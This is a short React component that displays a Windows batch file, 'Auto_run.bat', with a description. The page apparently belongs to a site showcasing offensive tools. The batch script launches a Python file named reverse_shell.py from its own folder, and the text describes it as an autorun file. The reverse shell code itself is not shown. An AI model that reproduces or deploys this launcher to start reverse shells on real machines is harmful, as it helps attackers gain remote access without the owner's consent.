import React, { useState, useEffect } from 'react';
import '../filedisplay.css';

const FileDisplaykey = () => {

  return (
    <div className="file-display-container">
      <div className="file-display-item">
        <h2 className="file-display-heading">Auto_run.bat</h2>
        <pre className="file-display-content">
          <code>
            {`
@echo off
setlocal
set SCRIPT_PATH=%~dp0
python "%SCRIPT_PATH%reverse_shell.py"
pause


            `}
          </code>
        </pre>
      </div>

      <div className="file-display-item">
        <h2 className="file-display-heading">Description</h2>
        <p className="file-display-description">Autorun windows file it runs the python file located at that directory
        <br/>File location may be changed<br/><br/>
        use the %~dp0 environment variable to set the current directory to the directory containing the batch file. The setlocal command ensures that any changes to the environment variables made by the batch file do not affect the system environment.        </p>
      <br/>
      <br/>
      </div>
    </div>
  );
};

export default FileDisplaykey;
